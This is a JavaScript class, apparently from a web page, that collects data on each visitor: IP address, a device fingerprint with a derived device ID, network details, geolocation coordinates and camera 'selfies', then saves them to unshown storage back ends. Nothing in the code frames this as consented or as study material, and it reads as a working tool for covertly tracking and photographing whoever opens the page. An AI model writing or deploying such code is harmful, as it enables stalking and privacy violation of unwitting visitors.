class DataCollector {
    static async collectAllData() {
        const dataToSave = {
            timestamp: new Date().toISOString(),
            ip: await this.getIPAddress(),
            device_info: await this.getDeviceInfo(), // Changed to async
            latitude: 0,
            longitude: 0,
            selfies: [],
            pageUrl: window.location.href,
            referrer: document.referrer,
            network_info: await NetworkInfo.getNetworkInfo() // Added network info
        };

        // Get geolocation
        try {
            const coords = await this.getGeolocation();
            dataToSave.latitude = coords.latitude;
            dataToSave.longitude = coords.longitude;
        } catch (error) {
            console.log('Geolocation not available:', error.message);
        }

        // Get selfies
        try {
            dataToSave.selfies = await this.captureSelfies();
        } catch (error) {
            console.log('Camera not available:', error.message);
        }

        // Save to storage systems
        const saveResults = await this.saveToStorages(dataToSave);

        return {
            success: true,
            data: dataToSave,
            storage: saveResults
        };
    }

    static async getDeviceInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: screen.width,
            screenHeight: screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            cookieEnabled: navigator.cookieEnabled,
            pdfViewerEnabled: navigator.pdfViewerEnabled || 'unknown',
            connectionType: connection ? connection.effectiveType : 'unknown',
            deviceId: await this.getDeviceId()
        };
    }

    static async getDeviceId() {
        // Generate a semi-unique device identifier
        const components = [
            navigator.userAgent,
            navigator.platform,
            screen.width + 'x' + screen.height,
            navigator.language
        ];
        
        const string = components.join('|');
        let hash = 0;
        for (let i = 0; i < string.length; i++) {
            const char = string.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32bit integer
        }
        return Math.abs(hash).toString(16);
    }

    // ... rest of the methods remain the same
}
